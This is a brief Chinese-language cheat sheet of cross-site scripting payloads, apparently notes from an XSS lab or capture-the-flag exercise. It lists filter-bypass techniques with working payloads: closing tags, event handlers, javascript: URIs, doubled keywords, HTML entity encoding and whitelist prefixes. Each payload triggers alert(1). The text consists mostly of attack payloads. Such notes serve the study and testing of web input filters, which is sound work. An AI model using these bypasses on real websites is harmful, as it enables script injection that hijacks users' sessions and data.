#### 普通的pyload

<script>alert(1)</script>

#### <>实体转义绕过

>"><script>alert(1)</script><"

合并前后标签，相当于在中间插了一句js

#### <>全部实体转义绕过

```html
' onfocus=javascript:alert() '
```

不使用<>标签，闭合前方后标签通过事件触发弹窗

#### on和script过滤

不能使用事件和标签,使用javascript伪标签

```
"><a href="javascript:alert(1)">
```

#### src，herf，data都被过滤了，没有过滤大小写，双写绕过

```
"><scscriptript>alert(1)</sscriptcript>
```

#### on,script,src,href,data,",都进行过滤

可以将语句实体转义插入

例如javascript:alert(1)转义成

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

插入

#### 白名单绕过，必须带有规定的参数才能绕过

在输入前面加上要求的参数

比如//http://javascript:alert(1)